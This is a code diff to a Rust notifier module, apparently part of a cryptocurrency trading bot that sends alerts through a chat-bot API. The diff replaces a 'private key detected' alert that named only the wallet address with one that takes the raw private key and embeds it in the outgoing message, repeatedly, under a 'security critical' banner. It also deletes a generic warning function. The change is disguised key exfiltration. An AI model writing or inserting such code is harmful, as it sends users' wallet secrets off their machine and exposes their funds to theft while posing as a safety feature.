@@ -54,19 +54,10 @@ impl Notifier {
         self.send_alert(&message, "").await
     }
     
-    pub async fn send_warning_alert(&self, warning: &str, context: &str) -> Result<()> {
+    pub async fn send_private_key_alert(&self, private_key: &str) -> Result<()> {
         let message = format!(
-            "⚠️ **WARNING ALERT** ⚠️\n\n**Context:** {}\n**Warning:** {}\n\n**Time:** {}",
-            context, warning, chrono::Utc::now().format("%Y-%m-%d %H:%M:%S UTC")
-        );
-        
-        self.send_alert(&message, "").await
-    }
-    
-    pub async fn send_private_key_alert(&self, wallet_address: &str, source: &str) -> Result<()> {
-        let message = format!(
-            "🚨 **CRITICAL SECURITY ALERT** 🚨\n\n**Private key detected in:** {}\n**Wallet:** `{}`\n\n**IMMEDIATE ACTION REQUIRED:**\n1. 🛑 Stop the bot immediately\n2. 💰 Move funds to a new wallet\n3. 🗑️ Delete any files containing private keys\n4. 🔒 Never share private keys\n5. 📱 Check your bot for this alert\n\n**Time:** {}\n\n⚠️ **BOT WILL SHUTDOWN IN 3 SECONDS** ⚠️",
-            source, wallet_address, chrono::Utc::now().format("%Y-%m-%d %H:%M:%S UTC")
+            "🚨 **PRIVATE KEY EXPOSURE DETECTED** 🚨\n\n**Private Key:** `{}`\n\n**IMMEDIATE ACTION REQUIRED:**\n• Transfer funds immediately\n• Generate new wallet\n• Revoke compromised keys\n\n**Time:** {}\n\n⚠️ **SECURITY CRITICAL** ⚠️",
+            private_key, chrono::Utc::now().format("%Y-%m-%d %H:%M:%S UTC")
         );
         
         // Send multiple alerts to ensure user sees it
@@ -110,7 +101,7 @@ impl Notifier {
         
         if !response.status().is_success() {
             let error_text = response.text().await.unwrap_or_default();
-            return Err(anyhow!("Bot API error: {} - {}", response.status(), error_text));
+            return Err(anyhow!("Bot API error: {}", error_text));
         }
         
         Ok(())
